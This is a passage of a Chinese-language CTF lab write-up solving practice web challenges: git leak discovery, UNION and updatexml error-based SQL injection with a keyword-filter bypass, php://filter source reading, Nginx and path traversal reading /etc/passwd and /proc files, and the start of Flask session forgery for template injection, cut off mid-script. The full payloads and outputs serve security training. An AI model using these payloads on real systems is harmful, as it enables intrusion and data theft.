<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">200     5B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;COMMIT_EDITMSG</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;</span><br><span class="line">301   305B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git    -&gt; REDIRECTS TO: http:&#x2F;&#x2F;127.0.0.1&#x2F;.git&#x2F;</span><br><span class="line">200    23B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;HEAD</span><br><span class="line">200    73B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;description</span><br><span class="line">200   137B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;config</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;hooks&#x2F;</span><br><span class="line">200   240B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;info&#x2F;exclude</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;info&#x2F;</span><br><span class="line">200   145B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;index</span><br><span class="line">200   148B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;logs&#x2F;HEAD</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;logs&#x2F;</span><br><span class="line">301   315B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;logs&#x2F;refs    -&gt; REDIRECTS TO: http:&#x2F;&#x2F;127.0.0.1&#x2F;.git&#x2F;logs&#x2F;refs&#x2F;</span><br><span class="line">301   321B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;logs&#x2F;refs&#x2F;heads    -&gt; REDIRECTS TO: http:&#x2F;&#x2F;127.0.0.1&#x2F;.git&#x2F;logs&#x2F;refs&#x2F;heads&#x2F;</span><br><span class="line">200   148B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;logs&#x2F;refs&#x2F;heads&#x2F;master</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;objects&#x2F;</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;refs&#x2F;</span><br><span class="line">200    41B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;refs&#x2F;heads&#x2F;master</span><br><span class="line">301   316B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;refs&#x2F;heads    -&gt; REDIRECTS TO: http:&#x2F;&#x2F;127.0.0.1&#x2F;.git&#x2F;refs&#x2F;heads&#x2F;</span><br><span class="line">301   315B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;refs&#x2F;tags    -&gt; REDIRECTS TO: http:&#x2F;&#x2F;127.0.0.1&#x2F;.git&#x2F;refs&#x2F;tags&#x2F;</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.ht_wsr.txt</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess.bak1</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess.orig</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess.save</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess.sample</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccessBAK</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccessOLD</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccessOLD2</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess_extra</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess_orig</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess_sc</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htm</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.html</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htpasswd_test</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htpasswds</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.httr-oauth</span><br><span class="line">200     2KB  http:&#x2F;&#x2F;127.0.0.1:80&#x2F;index.html</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;server-status&#x2F;</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;server-status</span><br></pre></td></tr></table></figure></li>
<li><p>发现存在<code>.git</code>文件夹，试探访问<code>.git/config</code>，返回了下列内容，说明存在 git 泄露。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[core]</span><br><span class="line">	repositoryformatversion &#x3D; 0</span><br><span class="line">	filemode &#x3D; true</span><br><span class="line">	bare &#x3D; false</span><br><span class="line">	logallrefupdates &#x3D; true</span><br><span class="line">	ignorecase &#x3D; true</span><br><span class="line">	precomposeunicode &#x3D; true</span><br></pre></td></tr></table></figure></li>
<li><p>使用 <a href="https://github.com/denny0223/scrabble">scrabble</a> 工具，成功获到源码，拿到 flag。</p>
</li>
</ol>
<h2 id="1-2-SQL注入"><a href="#1-2-SQL注入" class="headerlink" title="1.2 SQL注入"></a>1.2 SQL注入</h2><h3 id="1-2-1-SQL注入-1"><a href="#1-2-1-SQL注入-1" class="headerlink" title="1.2.1 SQL注入-1"></a>1.2.1 SQL注入-1</h3><ol>
<li><p>127.0.0.1/index.php?id=2-1 的结果与 127.0.0.1/index.php?id=2 相同，说明不存在数字型注入。</p>
</li>
<li><p>尝试 127.0.0.1/index.php?id=2-1%27%23，发现页面有显示内容，说明是字符型注入。</p>
</li>
<li><p>尝试 UNION 注入，127.0.0.1/index.php?id=-1%27%23union%20select%201,2,3%23，发现成功返回数据。说明是 select 1,2,3 形式，并且1不会显示，3是用户输入的数据，2是数据库数据。</p>
</li>
<li><p>尝试获取表明 127.0.0.1/index.php?id=-1%27union%20select%201,group_concat(table_name),1%20from%20information_schema.tables%20where%20table_schema=database()%23，得到 fl4g，notes 两个表。</p>
</li>
<li><p>分别尝试获取列名。127.0.0.1/index.php?id=-1%27union%20select%201,group_concat(column_name),1%20from%20information_schema.columns%20where%20table_name=%27fl4g%27%23。在 fl4g 中获得 flag。</p>
</li>
</ol>
<h3 id="1-2-2-SQL注入-2"><a href="#1-2-2-SQL注入-2" class="headerlink" title="1.2.2 SQL注入-2"></a>1.2.2 SQL注入-2</h3><ol>
<li><p>访问 127.0.0.1，服务器返回 Forbidden，说明入口错误。尝试使用 dirsearch 工具扫描目录，发现 login.php、user.php 状态是200，找到入口。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">200     2KB  http:&#x2F;&#x2F;127.0.0.1:80&#x2F;login.php</span><br><span class="line">403   289B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;server-status</span><br><span class="line">403   290B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;server-status&#x2F;</span><br><span class="line">200    11B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;user.php</span><br></pre></td></tr></table></figure></li>
<li><p>访问 <a href="http://127.0.0.1/login.php">http://127.0.0.1:80/login.php</a> ，随机使用账号密码登录，未发现异常。查看源码，发现注释中有提示：<code>如果觉得太难了，可以在url后加入?tips=1 开启mysql错误提示,使用burp发包就可以看到啦</code></p>
</li>
<li><p>安装 burp suit 社区版<br>下载链接：<a href="https://portswigger.net/burp/releases/professional-community-2021-2-1">https://portswigger.net/burp/releases/professional-community-2021-2-1</a><br>安装命令：<code>sh burpsuite_community_linux_v2021_2_1.sh</code> </p>
</li>
<li><p>配置 burp suit</p>
<blockquote>
<ol>
<li>进入 Proxy -&gt;  option，选择 add，端口用 8080，选择  Loopback only。</li>
<li>进入浏览器的代理设置，http/https 代理均设为 127.0.0.1，端口 8080。(与 burp 内设置的一致)<br><img src="burp_proxy.png" alt="burp proxy"></li>
</ol>
</blockquote>
</li>
<li><p>使用 burp suit 抓包、发包。</p>
<blockquote>
<p>进入 Proxy -&gt; intercep 页面。如果浏览器与 burp 设置成功，浏览器发出的包会先到 burp，burp 中可对这个包执行修改、转发、丢弃等等操作。在 intercep 这行一系列对包的操作。<br><img src="burp_intercept.png" alt="burp intercept"></p>
</blockquote>
</li>
<li><p>火狐浏览器会自动周期性的发包，可先在火狐浏览器核心设置中取消这周期性的发包，具体发的包可以 burp 中 Proxy菜单下的 HTTP history 页面中看到。</p>
</li>
<li><p>burp 有时不会捕获 127.0.0.1 的流量。如果要捕获发至本机的包，使用 <code>ifconfig</code> 命令先找到本机的 ip，用本机的 ip 代替 127.0.0.1 访问，成功捕获。我的主机 ip 是 172.19.0.1。</p>
</li>
<li><p>burp 捕获访问 <a href="http://172.19.0.1/login.php">http://172.19.0.1/login.php</a> 的包（注意此处需要捕获的是输入账号密码点击登录后产生的包），在 intercep 页面 request 栏右键选择 action：<code>Send to Repeater（Ctrl + R）</code>，再进入 Repeater 页面。在 request 中修改请求头。</p>
</li>
<li><p> 根据提示，先在 post 的 url 中添加 ?tips=1，发送后发现无有效信息。于是修改 name，由原来的 123 改为 123’（登录的用户名），成功返回 SQL 报错信息：</p>
<blockquote>
<p>string(154) “You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘’123’’’ at line 1”<br><img src="burp_login_request.png" alt="burp login request"></p>
</blockquote>
</li>
<li><p>可能存在报错注入，于是使用 updatexml 函数。继续修改 request 中请求头信息：</p>
<blockquote>
<p><code>name=123&#39;or updatexml(1,concat(0x7e,(select(7,8,9)),0x7e),1)#&amp;pass=123</code></p>
</blockquote>
<p>返回报错内容：string(34) “Operand should contain 1 column(s)”</p>
<p>可能只有1列，尝试 <code>name=123&#39;or updatexml(1,concat(0x7e,(select(7)),0x7e),1)#&amp;pass=123</code></p>
<p>返回报错内容：<code>~7~</code>。确定格式。（0x7e：~ ）</p>
</li>
<li><p>使用完整 SQL 语句测试：<code>name=123&#39;or updatexml(1,concat(0x7e,(select(7) from dual ),0x7e),1)#&amp;pass=123</code>,返回如下 SQL 错误。根据报错信息，说明可能存在关键字的替换，最有可能替换的是 select ,于是使用嵌套 select，即 seselectlect 替换 select，再次成功返回信息<code>~7~</code>。</p>
<blockquote>
<p>string(164) “You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘from dual)),1)#’’ at line 1”</p>
</blockquote>
</li>
<li><p>通过获取表名，列名成功获得 flag。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;test&#39;and updatexml(1,concat(0x7e,(seselectlect group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()) ,0x7e),1)#&amp;pass&#x3D;xxxx</span><br><span class="line"></span><br><span class="line">string(34) &quot;XPATH syntax error: &#39;~fl4g,users~&#39;&quot;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;test&#39;and updatexml(1,concat(0x7e,(seselectlect group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;fl4g&#39;),0x7e),1)#&amp;pass&#x3D;xxxx</span><br><span class="line"></span><br><span class="line"># 返回信息：string(28) &quot;XPATH syntax error: &#39;~flag~&#39;&quot;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="1-3-任意文件读取漏洞"><a href="#1-3-任意文件读取漏洞" class="headerlink" title="1.3 任意文件读取漏洞"></a>1.3 任意文件读取漏洞</h2><h3 id="1-3-1-afr-1"><a href="#1-3-1-afr-1" class="headerlink" title="1.3.1 afr_1"></a>1.3.1 afr_1</h3><ol>
<li><p>访问本机 ip(172.19.0.1) 进入环境，发现重定向至了 ?p=hello，联想书中”病者多诡(HCTF 2016)”，很有可能类似，猜测存在 include 函数，p 可能是 page。</p>
</li>
<li><p>使用 wappalyzer 插件获得网站的 Banner 信息，确定是 php。<br><img src="afr_1_wappalyzer.png" alt="wappalyzer"></p>
</li>
<li><p>使用 dirsearch 进行目录扫描，发现存在 index.php，且重定向至 ?p=hello</p>
</li>
<li><p>于是尝试访问 <code>http://172.19.0.1/index.php</code>，重定向至了<code>http://172.19.0.1/?p=hello</code>，而访问<code>http://172.19.0.1/?p=index</code>则是报错。</p>
</li>
<li><p>尝试使用 php 的 filter 获取 index.php,<code>http://172.19.0.1/?p=php://filter/read=convert.Base64-encode/resource=index</code>,获得数据<code>PD9waHAKCmlmKGlzc2V0KCRfR0VUWydwJ10pKSB7CiAgICBpbmNsdWRlIChzdHJpbmcpJF9HRVRbJ3AnXSAuICIucGhwIjsKfQplbHNlewogICAgaGVhZGVyKCdMb2NhdGlvbjogLz9wPWhlbGxvJyk7Cn0=</code>，解码后得</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#39;p&#39;])) &#123;</span><br><span class="line">  include (string)$_GET[&#39;p&#39;] . &quot;.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">  header(&#39;Location: &#x2F;?p&#x3D;hello&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>清楚了逻辑，直接尝试 <code>flag.php</code>,即<code>http://172.19.0.1/?p=php://filter/read=convert.Base64-encode/resource=flag</code>,获得数据<code>PD9waHAKZGllKCdubyBubyBubycpOwovL24xYm9va3thZnJfMV9zb2x2ZWR9</code>，解码得</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">die(&#39;no no no&#39;);</span><br><span class="line">&#x2F;&#x2F;n1book&#123;afr_1_solved&#125;</span><br></pre></td></tr></table></figure>
<p>明显注释中可能表示 flag，查看官方 write up:<code>http://172.19.0.1/?p=php://filter/convert.base64-encode/resource=flag</code>，确定无错。</p>
</li>
<li><p>php://协议 Filter解读： <code>?p=php://filter/read=convert.Base64-encode/resource=flag</code></p>
<ul>
<li>这是 p 关键字得 get 传递，即p=****</li>
<li>php://是一种协议名称，php://filter/ 是一种访问本地文件的协议</li>
<li>read=convert.Base64-encode 表示文件流编码成 Base64 的形式，这样读取的内容就不会存在 PHP 标签</li>
<li>/resource=flag 表示目标文件是 flag.php</li>
</ul>
</li>
</ol>
<h3 id="1-3-2-afr-2"><a href="#1-3-2-afr-2" class="headerlink" title="1.3.2 afr_2"></a>1.3.2 afr_2</h3><ol>
<li>访问环境，使用 wappalyzer 插件获得网站的 Banner 信息,发现服务器使用的 Nginx<br><img src="afr_2_wappalyzer.png" alt="wappalyzer"></li>
<li>使用 dirsearch 进行目录扫描，发现<code>/img</code>目录可以直接访问<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">301   194B   http:&#x2F;&#x2F;172.19.0.1:80&#x2F;img    -&gt; REDIRECTS TO: http:&#x2F;&#x2F;172.19.0.1&#x2F;img&#x2F;</span><br><span class="line">200    99B   http:&#x2F;&#x2F;172.19.0.1:80&#x2F;index.html</span><br></pre></td></tr></table></figure></li>
<li>想起 Nginx 错误配置造成的目录穿越漏洞，使用访问路径<code>/img../</code>，获得 flag。</li>
</ol>
<h3 id="1-3-3-afr-3"><a href="#1-3-3-afr-3" class="headerlink" title="1.3.3 afr_3"></a>1.3.3 afr_3</h3><ul>
<li>【知识点】:<ul>
<li>任意文件读取</li>
<li>flask SSTI 模板注入<ul>
<li><a href="https://xz.aliyun.com/t/3679">flask之ssti模版注入从零到入门</a></li>
</ul>
</li>
<li>session 伪造<ul>
<li><a href="https://blog.csdn.net/DonkeyMoon/article/details/109690476">flask session 伪造</a></li>
<li><a href="https://blog.csdn.net/rfrder/article/details/109188719">[HCTF 2018]admin 1</a></li>
<li><a href="https://blog.csdn.net/SopRomeo/article/details/111186821?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&dist_request_id=1328680.24088.16162219708244293&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control">N1BOOK 入门session伪造</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<ol>
<li><p><code>172.19.0.1:5000</code> 访问本题环境，在 <code>your name</code>框键入<code>test</code>，点<code>提交</code>。</p>
</li>
<li><p>跳转到了<code>http://172.19.0.1:5000/n1page</code>,并且页面显示：<code>Hello : test, why you don&#39;t look at our article?</code>，点击 <code>article</code> 跳转到了<code>http://172.19.0.1:5000/article?name=article</code></p>
</li>
<li><p>注意到 url 中有参数 name,<code>name=article</code>,尝试随意赋值 name，页面回显：<code>[Errno 2] No such file or directory: &#39;/home/nu11111111l/articles/article1&#39;</code>，获得路径信息，并且很有可能是 linux 服务器，其实在 wappalyzer 中有检测出是 ubuntu</p>
</li>
<li><p>尝试文件读取漏洞中常见的读取路径。先尝试 <code>/etc/passwd</code>，即<code>http://172.19.0.1:5000/article?name=/../../../etc/passwd</code>,成功回显<code>passwd</code>文件信息。研究了下 linux 的 passwd，没发现特殊的信息，继续尝试其他路径。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash </span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync </span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">_apt:x:100:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">messagebus:x:101:101::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br></pre></td></tr></table></figure></li>
<li><p>尝试 <code>/proc/self/cmdline</code>,，即<code>http://172.19.0.1:5000/article?name=/../../../proc/self/cmdline</code>，获得回显信息：<code>pythonserver.py</code>,获得题目是 python 的服务器。</p>
</li>
<li><p>尝试在 <code>environ</code> 查看环境变量，即<code>http://172.19.0.1:5000/article?name=/../../../proc/self/environ</code>,获得环境变量,得知<code>server.py</code> 在 <code>/home/sssssserver</code>路径下。</p>
<blockquote>
<p>HOSTNAME=c0b8f0d6cb78HOME=/rootPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binPWD=/home/sssssserver</p>
</blockquote>
</li>
<li><p>直接访问<code>server.py</code>，即<code>http://172.19.0.1:5000/article?name=/../../../home/sssssserver/server.py</code>,成功回显 <code>server.py</code> 源码。（server.py 可以通过<code>/proc/self/cwd</code>进入当前应用所在目录直接获得，即<code>http://172.19.0.1:5000/article?name=/../../../proc/self/cwd/server.py</code>）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> (Flask, render_template, request, url_for, redirect, session, render_template_string)</span><br><span class="line"><span class="keyword">from</span> flask_session <span class="keyword">import</span> Session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># execfile() 函数可以用来执行一个文件。</span></span><br><span class="line">execfile(<span class="string">&#x27;flag.py&#x27;</span>)</span><br><span class="line">execfile(<span class="string">&#x27;key.py&#x27;</span>)</span><br><span class="line">FLAG = flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在flask项目中，Session, Cookies以及一些第三方扩展都会用到SECRET_KEY值，这是一个比较重要的配置值。</span></span><br><span class="line">app.secret_key = key</span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问 host/n1page 时会进入此方法</span></span><br><span class="line"><span class="meta">@ app.route(<span class="params"><span class="string">&quot;/n1page&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">n1page</span>():</span></span><br><span class="line">	<span class="keyword">if</span> request.method != <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">		<span class="keyword">return</span> redirect(url_for(<span class="string">&quot;index&quot;</span>))</span><br><span class="line"></span><br><span class="line">	n1code = request.form.get(<span class="string">&quot;n1code&quot;</span>) <span class="keyword">or</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># 过滤</span></span><br><span class="line">	<span class="keyword">if</span> n1code <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">		n1code = n1code.replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;_&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#123;&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> <span class="string">&quot;n1code&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> session <span class="keyword">or</span> session[<span class="string">&#x27;n1code&#x27;</span>] <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">		session[<span class="string">&#x27;n1code&#x27;</span>] = n1code</span><br><span class="line"></span><br><span class="line">	template = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> session[<span class="string">&#x27;n1code&#x27;</span>] <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">		template = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">			&lt;h1&gt;N1 Page&lt;/h1&gt; &lt;div class=&quot;row&gt; </span></span><br><span class="line"><span class="string">			&lt;div class=&quot;col-md-6 col-md-offset-3 center&quot;&gt; </span></span><br><span class="line"><span class="string">			Hello : %s, why you don&#x27;t look at our &lt;a href=&#x27;/article?name=article&#x27;&gt;article&lt;/a&gt;?</span></span><br><span class="line"><span class="string">			 &lt;/div&gt; &lt;/div&gt; &#x27;&#x27;&#x27;</span> % session[<span class="string">&#x27;n1code&#x27;</span>]</span><br><span class="line"></span><br><span class="line">	session[<span class="string">&#x27;n1code&#x27;</span>] = <span class="literal">None</span></span><br><span class="line">	<span class="keyword">return</span> render_template_string(template) @ app.route(<span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">	<span class="keyword">return</span> render_template(<span class="string">&quot;main.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@ app.route(<span class="params"><span class="string">&#x27;/article&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">article</span>():</span></span><br><span class="line">	error = <span class="number">0</span></span><br><span class="line">	<span class="keyword">if</span> <span class="string">&#x27;name&#x27;</span> <span class="keyword">in</span> request.args:</span><br><span class="line">    	page = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">    	page = <span class="string">&#x27;article&#x27;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> page.find(<span class="string">&#x27;flag&#x27;</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">		page = <span class="string">&#x27;notallowed.txt&#x27;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">    	template = <span class="built_in">open</span>(<span class="string">&#x27;/home/nu11111111l/articles/&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(page)).read()</span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    	template = e</span><br><span class="line">	<span class="keyword">return</span> render_template(<span class="string">&#x27;article.html&#x27;</span>, template=template)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure></li>
<li><p>在 pycharm 中搭建环境，通过阅读源码知目录下有 <code>flag.py</code>，直接访问发现没有权限。继续阅读源码，发现<code>n1page</code>方法中存在模板注入，但是存在过滤</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> n1code <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">	n1code = n1code.replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;_&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#123;&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure></li>
</ol>
<p>  不过在接下来的对 session[<code>n1code</code>] 仅仅是简单判定是否为空，可以利用 falsk 的 session 伪造实现注入。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">if</span> session[<span class="string">&#x27;n1code&#x27;</span>] <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">template = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	&lt;h1&gt;N1 Page&lt;/h1&gt; &lt;div class=&quot;row&gt; </span></span><br><span class="line"><span class="string">	&lt;div class=&quot;col-md-6 col-md-offset-3 center&quot;&gt; </span></span><br><span class="line"><span class="string">	Hello : %s, why you don&#x27;t look at our &lt;a href=&#x27;/article?name=article&#x27;&gt;article&lt;/a&gt;?</span></span><br><span class="line"><span class="string">	 &lt;/div&gt; &lt;/div&gt; &#x27;&#x27;&#x27;</span> % session[<span class="string">&#x27;n1code&#x27;</span>]</span><br></pre></td></tr></table></figure>

<ol start="9">
<li><p>首先通过代码的逻辑，程序进入<code>n1page</code>方法，也就是访问<code>host/n1page</code>的时候，所以应该是抓访问<code>http://172.19.0.1:5000/n1page</code>的包。<br><img src="afr3_n1page_session.png" alt="afr3"></p>
</li>
<li><p>获取这个包的 session，然后使用解码函数解密，确定 session 字符串形式<code>&#123;&#39;n1code&#39;: None&#125;</code>，需要构造 payload 去替换 none。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> session_json_serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryption</span>(<span class="params">payload</span>):</span></span><br><span class="line">    payload, sig = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">    payload, timestamp = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    decompress = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> payload.startswith(<span class="string">b&#x27;.&#x27;</span>):</span><br><span class="line">        payload = payload[<span 